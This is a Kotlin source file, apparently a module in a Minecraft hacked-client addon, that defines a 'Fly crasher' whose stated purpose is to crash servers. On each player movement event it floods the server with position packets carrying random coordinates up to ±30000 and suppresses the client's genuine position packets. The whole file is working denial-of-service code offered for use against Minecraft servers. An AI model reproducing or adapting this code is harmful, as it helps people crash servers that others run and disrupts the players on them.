package de.florianmichael.tarasande_crasher.module

import de.florianmichael.tarasande_crasher.forcePacket
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket
import net.tarasandedevelopment.tarasande.event.impl.EventMovement
import net.tarasandedevelopment.tarasande.event.impl.EventPacket
import net.tarasandedevelopment.tarasande.mc
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
import java.util.concurrent.ThreadLocalRandom

class ModuleFlyCrasher : Module("Fly crasher", "Crashes the server using big motions", "Crasher") {

    private val repeat = ValueNumber(this, "Repeat", 1.0, 3.0, 10.0, 1.0)

    init {
        registerEvent(EventMovement::class.java) {
            if (it.entity != mc.player) return@registerEvent

            var trackedX: Double
            var trackedY: Double
            var trackedZ: Double

            for (i in 0 until repeat.value.toInt()) {
                trackedX = ThreadLocalRandom.current().nextDouble(-30000.0, 30000.0)
                trackedY = ThreadLocalRandom.current().nextDouble(-30000.0, 30000.0)
                trackedZ = ThreadLocalRandom.current().nextDouble(-30000.0, 30000.0)

                forcePacket(PlayerMoveC2SPacket.PositionAndOnGround(trackedX, trackedY, trackedZ, mc.player!!.isOnGround))
            }
        }

        registerEvent(EventPacket::class.java) {
            if (it.type == EventPacket.Type.SEND && it.packet is PlayerMoveC2SPacket.PositionAndOnGround) {
                it.cancelled = true
            }
        }
    }
}
